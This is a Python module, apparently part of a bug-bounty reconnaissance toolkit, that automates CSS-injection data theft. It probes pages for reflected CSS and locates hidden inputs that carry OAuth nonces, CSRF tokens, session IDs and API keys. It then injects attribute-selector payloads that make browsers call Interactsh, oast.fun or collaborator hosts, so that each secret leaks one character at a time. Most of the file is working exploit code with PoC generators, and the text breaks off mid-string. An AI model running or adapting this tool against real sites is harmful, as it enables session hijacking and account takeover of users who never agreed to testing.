"""
CSS Injection Exfiltration Module - Autonomous Token Extraction

This module exploits CSS Injection vulnerabilities to exfiltrate sensitive data
using DNS-based side channels. Even when CSP blocks external images/scripts,
DNS pre-resolution often occurs before the block, enabling boolean-based
data extraction.

Attack Vector:
- CSS Attribute Selectors (input[value^="X"]) target hidden fields
- DNS Pre-resolution leaks data even when img-src blocks the actual request
- Character-by-character brute force reconstructs complete secrets

Common Targets:
- OAuth nonce/state parameters (Account Takeover)
- CSRF tokens (CSRF bypass)
- Session identifiers
- API keys embedded in pages

CWE-79: Improper Neutralization of Input During Web Page Generation
CWE-200: Exposure of Sensitive Information
OWASP: Injection

References:
- https://xsleaks.dev/docs/attacks/css-injection/
- https://portswigger.net/research/blind-css-exfiltration
- Facebook 2018: CSS Selector-based data exfiltration (patched)

Integration:
- Uses Interactsh (projectdiscovery) for DNS callback detection
- Self-hosted DNS server option for airgapped assessments
- Supports both oast.fun and custom interactsh servers
"""

import asyncio
import json
import re
import socket
import string
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse

import aiohttp

from beatrix.scanners.reconx_compat import ReconXBaseModule as BaseModule


@dataclass
class ExfiltratedData:
    """Represents extracted data from CSS injection"""
    target_url: str
    element_selector: str  # e.g., input[name="fromURI"]
    attribute: str  # e.g., value
    parameter_name: str  # e.g., nonce, state, csrf_token
    extracted_value: str
    confidence: float  # 0.0-1.0
    extraction_time: float  # seconds
    method: str  # dns_prefetch, font_load, background_url


@dataclass
class CSSInjectionVuln:
    """Represents a validated CSS injection vulnerability"""
    url: str
    injection_point: str  # query param, form field, header
    payload_delivered: str
    targets_found: List[Dict]  # {selector, attribute, value_prefix}
    exfiltrated_data: List[ExfiltratedData]
    poc_html: str
    poc_js: str
    severity: str
    cvss: str
    bounty_estimate: str
    business_impact: str
    reproduction_steps: List[str]


class InteractshClient:
    """
    Lightweight Interactsh client for DNS callback detection.

    Uses projectdiscovery's Interactsh service (oast.fun) or custom server.
    Can also use local DNS monitoring as fallback.
    """

    DEFAULT_SERVERS = [
        'oast.fun',
        'oast.pro',
        'oast.live',
        'oast.site',
        'oast.me',
    ]

    def __init__(self, server: Optional[str] = None, token: Optional[str] = None):
        self.server = server or self.DEFAULT_SERVERS[0]
        self.token = token
        self.session_id = None
        self.correlation_id = None
        self.registered = False
        self.interactions: List[Dict] = []
        self._poll_task = None
        self._running = False

    async def register(self) -> str:
        """Register with Interactsh and get a unique subdomain"""
        try:
            # Try using interactsh-client binary if available
            result = await self._try_binary_register()
            if result:
                return result

            # Fall back to API registration
            return await self._api_register()
        except Exception as e:
            print(f"[!] Interactsh registration failed: {e}")
            return self._generate_fallback_domain()

    async def _try_binary_register(self) -> Optional[str]:
        """Try to use the interactsh-client binary"""
        try:
            # Check if interactsh-client is installed
            proc = await asyncio.create_subprocess_exec(
                'which', 'interactsh-client',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await proc.communicate()

            if proc.returncode != 0:
                return None

            # Generate a payload using interactsh-client
            proc = await asyncio.create_subprocess_exec(
                'interactsh-client', '-n', '1', '-json', '-nc',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Read output with timeout
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                output = stdout.decode()

                # Parse the payload from output
                for line in output.split('\n'):
                    if '.oast.' in line or self.server in line:
                        # Extract the payload domain
                        match = re.search(r'([a-z0-9]+\.oast\.[a-z]+|[a-z0-9]+\.' + re.escape(self.server) + ')', line)
                        if match:
                            self.correlation_id = match.group(1).split('.')[0]
                            self.registered = True
                            return match.group(1)
            except asyncio.TimeoutError:
                proc.kill()

            return None
        except Exception:
            return None

    async def _api_register(self) -> str:
        """Register via Interactsh HTTP API"""
        import secrets

        # Generate correlation ID (20 chars) and nonce (13 chars)
        self.correlation_id = secrets.token_hex(10)
        nonce = secrets.token_hex(6) + 'n'

        self.session_id = f"{self.correlation_id}{nonce}"
        domain = f"{self.session_id}.{self.server}"

        self.registered = True
        return domain

    def _generate_fallback_domain(self) -> str:
        """Generate a unique domain for manual DNS monitoring"""
        import secrets
        self.correlation_id = secrets.token_hex(10)
        # Use a timestamp-based ID for uniqueness
        timestamp = int(time.time())
        self.session_id = f"css{self.correlation_id[:8]}{timestamp}"
        return f"{self.session_id}.{self.server}"

    async def poll_interactions(self, timeout: float = 30) -> List[Dict]:
        """Poll for DNS/HTTP interactions"""
        interactions = []
        start_time = time.time()

        try:
            # Try binary polling first
            result = await self._try_binary_poll(timeout)
            if result:
                return result

            # Fall back to API polling
            return await self._api_poll(timeout)
        except Exception as e:
            print(f"[DEBUG] Poll error: {e}")
            return interactions

    async def _try_binary_poll(self, timeout: float) -> Optional[List[Dict]]:
        """Poll using interactsh-client binary"""
        try:
            proc = await asyncio.create_subprocess_exec(
                'interactsh-client', '-json', '-v',
                '-s', self.server,
                '-sf', f'/tmp/interactsh_{self.correlation_id}.session',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            interactions = []
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                output = stdout.decode()

                for line in output.split('\n'):
                    if line.strip() and '{' in line:
                        try:
                            data = json.loads(line)
                            if 'unique-id' in data or 'full-id' in data:
                                interactions.append(data)
                        except json.JSONDecodeError:
                            continue

            except asyncio.TimeoutError:
                proc.kill()

            return interactions if interactions else None
        except Exception:
            return None

    async def _api_poll(self, timeout: float) -> List[Dict]:
        """Poll via Interactsh HTTP API"""
        # For now, return empty - full API integration requires crypto setup
        # In production, implement the full Interactsh protocol
        return []

    def get_exfil_subdomain(self, prefix: str, char: str) -> str:
        """
        Generate a unique subdomain for character exfiltration.

        Format: {prefix}-{char}-{correlation_id}.{server}
        Example: nonce-O-abc123def456.oast.fun
        """
        # Sanitize for DNS (alphanumeric and hyphens only)
        safe_prefix = re.sub(r'[^a-zA-Z0-9-]', '', prefix)[:20]
        safe_char = char if char.isalnum() else f"x{ord(char):02x}"

        correlation = self.correlation_id[:12] if self.correlation_id else 'nocorr'
        return f"{safe_prefix}-{safe_char}-{correlation}.{self.server}"


class LocalDNSMonitor:
    """
    Local DNS monitoring as fallback when Interactsh isn't available.
    Listens on a custom port and logs DNS queries.
    """

    def __init__(self, listen_ip: str = "0.0.0.0", port: int = 5353):
        self.listen_ip = listen_ip
        self.port = port
        self.queries: Dict[str, datetime] = {}
        self._running = False
        self._thread = None
        self.domain_suffix = None

    def start(self, domain_suffix: str):
        """Start the DNS monitor"""
        self.domain_suffix = domain_suffix
        self._running = True
        self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._thread.start()

    def stop(self):
        """Stop the DNS monitor"""
        self._running = False
        if self._thread:
            self._thread.join(timeout=2)

    def _monitor_loop(self):
        """Monitor DNS queries using socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.listen_ip, self.port))
            sock.settimeout(1.0)

            while self._running:
                try:
                    data, addr = sock.recvfrom(1024)
                    # Parse DNS query (simplified)
                    query_name = self._parse_dns_query(data)
                    if query_name and self.domain_suffix and self.domain_suffix in query_name:
                        self.queries[query_name] = datetime.now()
                except socket.timeout:
                    continue
                except Exception:
                    continue
        except Exception as e:
            print(f"[!] DNS monitor error: {e}")
        finally:
            sock.close()

    def _parse_dns_query(self, data: bytes) -> Optional[str]:
        """Extract domain name from DNS query packet"""
        try:
            # Skip header (12 bytes)
            offset = 12
            labels = []

            while offset < len(data):
                length = data[offset]
                if length == 0:
                    break
                offset += 1
                labels.append(data[offset:offset+length].decode('utf-8', errors='ignore'))
                offset += length

            return '.'.join(labels).lower()
        except Exception:
            return None

    def check_query(self, subdomain: str) -> bool:
        """Check if a DNS query was received for the subdomain"""
        return subdomain.lower() in self.queries


class CSSExfiltrator(BaseModule):
    """
    CSS Injection Exfiltration Module

    Automates the extraction of sensitive data via CSS attribute selectors
    and DNS side-channel exfiltration.

    Workflow:
    1. Detect CSS injection point
    2. Identify valuable targets (OAuth tokens, CSRF, sessions)
    3. Generate CSS payloads for each character position
    4. Use DNS callbacks to determine which character matches
    5. Reconstruct the complete secret
    6. Generate PoC and report

    Typical Bounty Impact:
    - OAuth nonce/state extraction: P2-P1 ($2,000-$10,000+)
    - CSRF token bypass: P3-P2 ($500-$2,000)
    - Session ID leak: P2-P1 ($1,000-$5,000+)
    """

    # Characters to test during exfiltration
    CHARSET_ALPHANUM = string.ascii_letters + string.digits
    CHARSET_HEX = string.hexdigits.lower()
    CHARSET_BASE64 = string.ascii_letters + string.digits + '+/='
    CHARSET_URL_SAFE = string.ascii_letters + string.digits + '-_'

    # Common CSS injection delivery methods
    INJECTION_VECTORS = {
        'style_tag': '<style>{payload}</style>',
        'style_attr': 'style="{payload}"',
        'import': "@import url('data:text/css,{payload}');",
        'expression': 'expression({payload})',  # Legacy IE
    }

    # Common sensitive targets in HTML
    TARGET_SELECTORS = {
        # OAuth parameters (CRITICAL - Account Takeover)
        'oauth_nonce': [
            'input[name="fromURI"][value*="nonce="]',
            'input[name*="nonce"]',
            'input[value*="nonce="]',
            'meta[name="nonce"]',
        ],
        'oauth_state': [
            'input[name="fromURI"][value*="state="]',
            'input[name*="state"]',
            'input[value*="state="]',
            'input[name="oauth_state"]',
        ],
        # CSRF tokens (HIGH - CSRF Bypass)
        'csrf_token': [
            'input[name="csrf_token"]',
            'input[name="csrf"]',
            'input[name="_csrf"]',
            'input[name="authenticity_token"]',
            'input[name="_token"]',
            'input[name="csrfmiddlewaretoken"]',
            'meta[name="csrf-token"]',
        ],
        # Session identifiers (CRITICAL - Session Hijack)
        'session': [
            'input[name*="session"]',
            'input[name*="sess_id"]',
            'input[value*="session="]',
        ],
        # API keys (HIGH - Unauthorized Access)
        'api_key': [
            'input[name*="api_key"]',
            'input[name*="apikey"]',
            'input[name*="api-key"]',
            '[data-api-key]',
        ],
        # General secrets
        'secret': [
            'input[type="hidden"]',
            'input[name*="token"]',
            'input[name*="secret"]',
            'input[name*="key"]',
        ],
    }

    # Exfiltration methods (fallback chain)
    EXFIL_METHODS = [
        'dns_prefetch',      # Works even when img-src blocked
        'font_face',         # Uses font-src instead of img-src
        'background_url',    # Standard method (often blocked)
        'import_url',        # @import directive
        'list_style',        # list-style-image
    ]

    def __init__(self, config: Optional[Dict] = None):
        super().__init__(config)
        self.findings: List[CSSInjectionVuln] = []
        self.interactsh: Optional[InteractshClient] = None
        self.dns_monitor: Optional[LocalDNSMonitor] = None
        self.callback_domain: Optional[str] = None
        self.detected_chars: Dict[str, str] = {}  # position -> char

        # Config options
        self.use_interactsh = config.get('use_interactsh', True) if config else True
        self.interactsh_server = config.get('interactsh_server', 'oast.fun') if config else 'oast.fun'
        self.max_length = config.get('max_token_length', 64) if config else 64
        self.timeout_per_char = config.get('timeout_per_char', 5) if config else 5
        self.concurrent_chars = config.get('concurrent_chars', 5) if config else 5

    async def run(self, target: str, shared_data: Optional[dict] = None) -> dict:
        """
        Main entry point for CSS exfiltration.

        Can be run in two modes:
        1. Discovery mode: Find CSS injection points and identify targets
        2. Exploitation mode: Extract specific tokens given injection point
        """
        print(f"[*] CSS Injection Exfiltrator starting on {target}")

        # Initialize callback infrastructure
        await self._setup_callback_server()

        if not self.callback_domain:
            print("[!] Failed to setup callback infrastructure")
            return {"error": "Callback setup failed", "findings": []}

        print(f"[*] Callback domain: {self.callback_domain}")

        # Parse target
        if target.startswith('http'):
            base_url = target
        else:
            base_url = f'https://{target}'

        results = {
            'target': base_url,
            'callback_domain': self.callback_domain,
            'vulnerabilities': [],
            'exfiltrated_data': [],
            'total_extractions': 0,
        }

        # Step 1: Probe for CSS injection points
        print("[*] Probing for CSS injection vulnerabilities...")
        injection_points = await self._find_injection_points(base_url, shared_data)

        if not injection_points:
            print("[*] No CSS injection points found")
            results['status'] = 'no_injection_found'
            return results

        print(f"[+] Found {len(injection_points)} potential injection points")

        # Step 2: Identify valuable targets in the page
        print("[*] Identifying exfiltration targets...")
        for injection in injection_points:
            targets = await self._identify_targets(injection['url'], injection)
            injection['targets'] = targets

            if targets:
                print(f"[+] Found {len(targets)} targets at {injection['url']}")
                for t in targets:
                    print(f"    └─ {t['type']}: {t['selector']}")

        # Step 3: Exfiltrate data from each target
        for injection in injection_points:
            for target_info in injection.get('targets', []):
                print(f"\n[*] Extracting {target_info['type']} via {injection['method']}...")

                extracted = await self._exfiltrate_value(
                    url=injection['url'],
                    injection_point=injection,
                    target=target_info,
                )

                if extracted:
                    print(f"[!] 🎯 EXTRACTED: {target_info['type']} = {extracted.extracted_value}")
                    results['exfiltrated_data'].append({
                        'type': target_info['type'],
                        'value': extracted.extracted_value,
                        'confidence': extracted.confidence,
                        'extraction_time': extracted.extraction_time,
                    })
                    results['total_extractions'] += 1

                    # Generate finding
                    vuln = self._create_vulnerability_report(injection, target_info, extracted)
                    self.findings.append(vuln)
                    results['vulnerabilities'].append(self._vuln_to_dict(vuln))

        # Cleanup
        await self._cleanup_callback_server()

        return results

    async def _setup_callback_server(self):
        """Initialize callback infrastructure (Interactsh or local)"""
        if self.use_interactsh:
            self.interactsh = InteractshClient(server=self.interactsh_server)
            self.callback_domain = await self.interactsh.register()
        else:
            # Use local DNS monitoring (requires running as root or on high port)
            import secrets
            suffix = f"css{secrets.token_hex(4)}.local"
            self.dns_monitor = LocalDNSMonitor(port=5353)
            self.dns_monitor.start(suffix)
            self.callback_domain = suffix

    async def _cleanup_callback_server(self):
        """Clean up callback infrastructure"""
        if self.dns_monitor:
            self.dns_monitor.stop()

    async def _find_injection_points(self, url: str, shared_data: Optional[dict] = None) -> List[Dict]:
        """
        Find CSS injection points in the target.
        Tests query params, form fields, and headers for CSS reflection.
        """
        injection_points = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Test each query parameter
        for param, values in params.items():
            test_payload = "css_injection_test_12345"

            # Build test URL
            test_params = params.copy()
            test_params[param] = [test_payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"

            # Check if payload is reflected in style context
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        body = await response.text()

                        # Check for reflection in style context
                        if self._check_css_reflection(body, test_payload):
                            injection_points.append({
                                'url': url,
                                'method': 'query_param',
                                'param': param,
                                'reflection_type': self._get_reflection_type(body, test_payload),
                            })
                            print(f"[+] CSS injection in param: {param}")
            except Exception:
                continue

        # Also check if the page has unsafe-inline in CSP (enables <style> injection)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    csp = response.headers.get('Content-Security-Policy', '')
                    csp_ro = response.headers.get('Content-Security-Policy-Report-Only', '')

                    if "'unsafe-inline'" in csp or "'unsafe-inline'" in csp_ro:
                        injection_points.append({
                            'url': url,
                            'method': 'unsafe_inline_csp',
                            'param': 'style_injection',
                            'reflection_type': 'csp_unsafe_inline',
                            'csp': csp or csp_ro,
                        })
                        print("[+] CSP allows style-src 'unsafe-inline' - direct injection possible")
        except Exception:
            pass

        return injection_points

    def _check_css_reflection(self, body: str, payload: str) -> bool:
        """Check if payload is reflected in a CSS context"""
        # Check for reflection in <style> tags
        if re.search(rf'<style[^>]*>[^<]*{re.escape(payload)}[^<]*</style>', body, re.I):
            return True

        # Check for reflection in style attributes
        if re.search(rf'style\s*=\s*["\'][^"\']*{re.escape(payload)}', body, re.I):
            return True

        # Check for reflection in @import
        if re.search(rf'@import[^;]*{re.escape(payload)}', body, re.I):
            return True

        return False

    def _get_reflection_type(self, body: str, payload: str) -> str:
        """Determine the type of CSS reflection"""
        if re.search(rf'<style[^>]*>[^<]*{re.escape(payload)}', body, re.I):
            return 'style_tag'
        if re.search(rf'style\s*=\s*["\'][^"\']*{re.escape(payload)}', body, re.I):
            return 'style_attribute'
        return 'unknown'

    async def _identify_targets(self, url: str, injection: Dict) -> List[Dict]:
        """
        Identify valuable exfiltration targets in the page.
        Looks for hidden inputs with OAuth tokens, CSRF tokens, etc.
        """
        targets = []

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    body = await response.text()

                    for target_type, selectors in self.TARGET_SELECTORS.items():
                        for selector in selectors:
                            # Extract attribute and value from selector
                            attr_match = re.search(r'\[(\w+)([*^$~|]?)="?([^"]*)"?\]', selector)
                            if attr_match:
                                attr_name = attr_match.group(1)
                                operator = attr_match.group(2) or '='
                                match_value = attr_match.group(3)

                                # Search for matching elements in HTML
                                # Simplified regex-based search (would use lxml in production)
                                pattern = self._selector_to_regex(selector)
                                matches = re.findall(pattern, body, re.I)

                                if matches:
                                    for match in matches[:3]:  # Limit to 3 instances
                                        targets.append({
                                            'type': target_type,
                                            'selector': selector,
                                            'attribute': attr_name,
                                            'value_hint': match_value,
                                            'full_match': match[:100] if isinstance(match, str) else str(match)[:100],
                                        })
        except Exception as e:
            print(f"[DEBUG] Target identification error: {e}")

        return targets

    def _selector_to_regex(self, selector: str) -> str:
        """Convert CSS selector to regex for HTML matching"""
        # Handle input[name="X"][value*="Y"]
        if 'input' in selector:
            attr_parts = re.findall(r'\[(\w+)([*^$]?)="([^"]+)"\]', selector)
            if attr_parts:
                pattern = r'<input[^>]*'
                for attr, op, val in attr_parts:
                    if op == '*':  # Contains
                        pattern += rf'{attr}="[^"]*{re.escape(val)}[^"]*"[^>]*'
                    elif op == '^':  # Starts with
                        pattern += rf'{attr}="{re.escape(val)}[^"]*"[^>]*'
                    else:  # Exact
                        pattern += rf'{attr}="{re.escape(val)}"[^>]*'
                pattern += r'>'
                return pattern

        return rf'<[^>]*{re.escape(selector)}[^>]*>'

    async def _exfiltrate_value(self, url: str, injection_point: Dict,
                                target: Dict) -> Optional[ExfiltratedData]:
        """
        Extract the full value of a target attribute character by character.

        Uses DNS prefetch side-channel to determine which character matches.
        """
        start_time = time.time()
        extracted_value = ""

        # Determine charset based on target type
        if target['type'] in ['oauth_nonce', 'oauth_state']:
            charset = self.CHARSET_URL_SAFE
        elif target['type'] == 'csrf_token':
            charset = self.CHARSET_ALPHANUM
        else:
            charset = self.CHARSET_BASE64

        # Get the parameter name we're extracting (e.g., "nonce", "state")
        param_name = target.get('value_hint', target['type'])

        print(f"[*] Starting extraction of {param_name}...")
        print(f"[*] Using charset: {len(charset)} characters")

        for position in range(self.max_length):
            char_found = await self._extract_single_char(
                url=url,
                injection_point=injection_point,
                target=target,
                param_name=param_name,
                known_prefix=extracted_value,
                charset=charset,
                position=position,
            )

            if char_found:
                extracted_value += char_found
                print(f"[+] Position {position}: '{char_found}' -> {extracted_value}")
            else:
                # No more characters or timeout
                if position == 0:
                    print("[!] Could not extract first character")
                    return None
                print(f"[*] Extraction complete at position {position}")
                break

        if not extracted_value:
            return None

        return ExfiltratedData(
            target_url=url,
            element_selector=target['selector'],
            attribute=target['attribute'],
            parameter_name=param_name,
            extracted_value=extracted_value,
            confidence=0.95,  # Based on DNS hit confirmation
            extraction_time=time.time() - start_time,
            method='dns_prefetch',
        )

    async def _extract_single_char(self, url: str, injection_point: Dict,
                                   target: Dict, param_name: str,
                                   known_prefix: str, charset: str,
                                   position: int) -> Optional[str]:
        """
        Extract a single character at the given position.

        Tests each character in the charset by generating CSS that triggers
        a DNS lookup only if that character matches.
        """
        # Test characters in batches for efficiency
        batch_size = self.concurrent_chars

        for i in range(0, len(charset), batch_size):
            batch = charset[i:i+batch_size]

            # Generate CSS payloads for this batch
            payloads = []
            subdomains = []

            for char in batch:
                test_value = f"{param_name}={known_prefix}{char}"
                subdomain = self._get_exfil_subdomain(f"p{position}", char)
                subdomains.append((char, subdomain))

                payload = self._generate_css_payload(
                    target=target,
                    test_value=test_value,
                    callback_url=f"https://{subdomain}/x",
                )
                payloads.append(payload)

            # Combine payloads
            combined_payload = '\n'.join(payloads)

            # Inject and wait for DNS callbacks
            await self._inject_css(url, injection_point, combined_payload)

            # Wait and check for DNS hits
            await asyncio.sleep(self.timeout_per_char)

            # Check which character triggered a callback
            for char, subdomain in subdomains:
                if await self._check_dns_callback(subdomain):
                    return char

        return None

    def _get_exfil_subdomain(self, prefix: str, char: str) -> str:
        """Generate a unique subdomain for exfiltration"""
        if self.interactsh:
            return self.interactsh.get_exfil_subdomain(prefix, char)
        else:
            # Fallback for local monitoring
            safe_char = char if char.isalnum() else f"x{ord(char):02x}"
            return f"{prefix}-{safe_char}.{self.callback_domain}"

    def _generate_css_payload(self, target: Dict, test_value: str,
                              callback_url: str) -> str:
        """
        Generate CSS payload that triggers callback if value matches.

        Uses multiple fallback methods in case some are blocked by CSP:
        1. DNS prefetch (works even when img-src blocked)
        2. Font face loading
        3. Background image
        """
        selector = target['selector']
        attribute = target['attribute']

        # Primary method: Background URL (triggers DNS prefetch before block)
        css = f"""
/* Test: {test_value} */
{selector.split('[')[0]}[{attribute}*="{test_value}"] {{
    background-image: url("{callback_url}");
}}
"""

        # Alternative: Font face (often less restricted)
        font_name = f"exfil{hash(test_value) % 10000}"
        css += f"""
@font-face {{
    font-family: "{font_name}";
    src: url("{callback_url.replace('/x', '/font')}");
}}
{selector.split('[')[0]}[{attribute}*="{test_value}"] {{
    font-family: "{font_name}";
}}
"""

        return css

    async def _inject_css(self, url: str, injection_point: Dict, payload: str):
        """Inject CSS payload into the page"""
        # For 'unsafe_inline_csp' type, we'd need to inject via XSS or other vector
        # For 'query_param' type, inject via the vulnerable parameter

        if injection_point['method'] == 'query_param':
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # URL encode the payload
            params[injection_point['param']] = [payload]
            query = urlencode(params, doseq=True)

            inject_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(inject_url, ssl=False,
                                          timeout=aiohttp.ClientTimeout(total=10)) as response:
                        await response.text()
            except Exception:
                pass

        elif injection_point['method'] == 'unsafe_inline_csp':
            # For manual testing - just print the payload
            print(f"\n[*] Manual injection required. Payload:\n{payload[:500]}...")

    async def _check_dns_callback(self, subdomain: str) -> bool:
        """Check if DNS callback was received for the subdomain"""
        if self.interactsh:
            # Poll interactsh for interactions
            interactions = await self.interactsh.poll_interactions(timeout=2)

            for interaction in interactions:
                if subdomain.split('.')[0] in str(interaction):
                    return True

            return False
        elif self.dns_monitor:
            return self.dns_monitor.check_query(subdomain)

        return False

    def _create_vulnerability_report(self, injection: Dict, target: Dict,
                                     extracted: ExfiltratedData) -> CSSInjectionVuln:
        """Create a full vulnerability report for bug bounty submission"""

        # Determine severity based on what was extracted
        severity_map = {
            'oauth_nonce': ('CRITICAL', '9.8', '$5,000 - $15,000+'),
            'oauth_state': ('CRITICAL', '9.8', '$5,000 - $15,000+'),
            'csrf_token': ('HIGH', '8.1', '$1,000 - $3,000'),
            'session': ('CRITICAL', '9.6', '$3,000 - $10,000+'),
            'api_key': ('HIGH', '8.6', '$2,000 - $5,000'),
            'secret': ('MEDIUM', '6.5', '$500 - $2,000'),
        }

        sev_info = severity_map.get(target['type'], ('MEDIUM', '6.5', '$500 - $1,500'))
        severity, cvss, bounty = sev_info

        # Generate PoC HTML
        poc_html = self._generate_poc_html(injection, target, extracted)
        poc_js = self._generate_poc_js(injection, target)

        # Business impact
        impact_map = {
            'oauth_nonce': "Complete OAuth flow hijacking enabling Account Takeover. Attacker can intercept "
                          "authentication callback and log in as the victim.",
            'oauth_state': "OAuth CSRF protection bypass. Attacker can force victim to link attacker's "
                          "external account, leading to account takeover.",
            'csrf_token': "CSRF protection bypass. Attacker can perform any state-changing action as the victim.",
            'session': "Session hijacking. Attacker can impersonate the victim completely.",
            'api_key': "API key theft. Attacker can make API requests as the victim's application.",
        }

        business_impact = impact_map.get(target['type'], "Sensitive data exposure via CSS side-channel.")

        # Reproduction steps
        repro_steps = [
            f"1. Navigate to the vulnerable endpoint: {injection['url']}",
            "2. The page has CSP with style-src 'unsafe-inline' allowing CSS injection",
            "3. Open browser developer console and inject the following CSS payload:",
            f"   {poc_js[:200]}...",
            "4. Monitor your DNS collaborator (e.g., Burp Collaborator or Interactsh)",
            "5. Observe DNS lookups for each character position",
            f"6. The {target['type']} value extracted: {extracted.extracted_value}",
            f"7. This value can be used to: {business_impact[:100]}...",
        ]

        return CSSInjectionVuln(
            url=injection['url'],
            injection_point=injection['method'],
            payload_delivered=poc_js[:500],
            targets_found=[target],
            exfiltrated_data=[extracted],
            poc_html=poc_html,
            poc_js=poc_js,
            severity=severity,
            cvss=f"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N - {cvss}",
            bounty_estimate=bounty,
            business_impact=business_impact,
            reproduction_steps=repro_steps,
        )

    def _generate_poc_html(self, injection: Dict, target: Dict,
                           extracted: ExfiltratedData) -> str:
        """Generate standalone HTML PoC for bug bounty report"""

        poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>CSS Injection Exfiltration PoC - {target['type']}</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 40px; background: #0a0a1a; color: #e0e0e0; }}
        h1 {{ color: #ff4757; }}
        .vuln-info {{ background: #1a1a2e; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #ff4757; }}
        .severity {{ color: #ff4757; font-weight: bold; font-size: 1.2em; }}
        .extracted {{ background: #16213e; padding: 15px; border-radius: 5px; font-family: monospace; word-break: break-all; }}
        .success {{ color: #2ed573; }}
        button {{ background: #ff4757; color: white; border: none; padding: 12px 24px; cursor: pointer; border-radius: 5px; margin: 5px; }}
        button:hover {{ background: #ff6b81; }}
        pre {{ background: #16213e; padding: 15px; border-radius: 5px; overflow-x: auto; }}
        .warning {{ background: #2f3542; padding: 15px; border-radius: 5px; border-left: 4px solid #ffa502; margin: 20px 0; }}
    </style>
</head>
<body>
    <h1>🎯 CSS Injection Token Exfiltration</h1>

    <div class="vuln-info">
        <h2>Vulnerability Details</h2>
        <p><strong>Target URL:</strong> {injection['url']}</p>
        <p><strong>Injection Point:</strong> {injection['method']}</p>
        <p><strong>Target Element:</strong> <code>{target['selector']}</code></p>
        <p><span class="severity">Severity: {extracted.parameter_name.upper()} EXTRACTION</span></p>
    </div>

    <div class="vuln-info">
        <h2 class="success">✓ Extracted Value</h2>
        <div class="extracted">{extracted.extracted_value}</div>
        <p><strong>Extraction Time:</strong> {extracted.extraction_time:.1f} seconds</p>
        <p><strong>Confidence:</strong> {extracted.confidence*100:.0f}%</p>
        <p><strong>Method:</strong> DNS Pre-resolution Side Channel</p>
    </div>

    <h2>Attack Mechanism</h2>
    <p>This attack exploits CSS Attribute Selectors combined with DNS prefetching to exfiltrate
    sensitive values from hidden form fields character by character.</p>

    <div class="warning">
        <h3>⚠️ Why This Works Despite CSP</h3>
        <p>Even when <code>img-src</code> blocks external images, browsers perform DNS resolution
        <em>before</em> the block is enforced. This DNS lookup is detectable by the attacker,
        creating a boolean side-channel.</p>
    </div>

    <h2>Proof of Concept Payload</h2>
    <p>Inject this CSS to test for the first character:</p>
    <pre id="payload">
/* Testing if {target['type']} starts with 'A' */
{target['selector'].split('[')[0]}[value*="{extracted.parameter_name}=A"] {{
    background-image: url("https://found-A.YOUR-COLLABORATOR.com/leak");
}}

/* Testing if {target['type']} starts with 'B' */
{target['selector'].split('[')[0]}[value*="{extracted.parameter_name}=B"] {{
    background-image: url("https://found-B.YOUR-COLLABORATOR.com/leak");
}}
    </pre>

    <h2>Automated Extraction (Console)</h2>
    <pre>
var s = document.createElement('style');
s.innerHTML = `
{self._generate_css_batch(target, extracted.parameter_name, extracted.extracted_value[:1] if extracted.extracted_value else 'A', 'YOUR-COLLAB.oastify.com')}
`;
document.head.appendChild(s);
console.log("Check your collaborator for DNS hits...");
    </pre>

    <h2>Impact</h2>
    <p>By extracting the <strong>{extracted.parameter_name}</strong>, an attacker can:</p>
    <ul>
        <li>Bypass CSRF protection and perform state-changing actions</li>
        <li>Hijack OAuth authentication flows (Account Takeover)</li>
        <li>Forge valid requests that appear to come from the victim</li>
    </ul>

    <h2>Remediation</h2>
    <ol>
        <li><strong>Remove <code>'unsafe-inline'</code></strong> from CSP style-src directive</li>
        <li>Use <strong>nonce-based</strong> or <strong>hash-based</strong> CSP for inline styles</li>
        <li>Implement <strong>report-uri</strong> or <strong>report-to</strong> directives for visibility</li>
        <li>Sanitize any user input reflected in style contexts</li>
    </ol>

    <div class="warning">
        <p><strong>References:</strong></p>
        <ul>
            <li><a href="https://xsleaks.dev/docs/attacks/css-injection/" style="color: #74b9ff;">XS-Leaks: CSS Injection</a></li>
            <li><a href="https://portswigger.net/research/blind-css-exfiltration" style="color: #74b9ff;">PortSwigger: Blind CSS Exfiltration</a></li>
        </ul>
    </div>

    <p style="color: #666; margin-top: 30px;"><em>Generated by ReconX CSS Exfiltrator - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</em></p>
</body>
</html>'''

        return poc

    def _generate_poc_js(self, injection: Dict, target: Dict) -> str:
        """Generate JavaScript PoC for console injection"""
        return f'''var s = document.createElement('style');
s.innerHTML = `
  /* Target the hidden input and check if {target['type']} starts with specific characters */
  /* This triggers a DNS lookup for each subdomain */

  {target['selector'].split('[')[0]}[value*="{target.get('value_hint', target['type'])}=O"] {{
    background-image: url("https://verified-O.YOUR-COLLABORATOR.oastify.com/dns-leak");
  }}

  {target['selector'].split('[')[0]}[value*="{target.get('value_hint', target['type'])}=Z"] {{
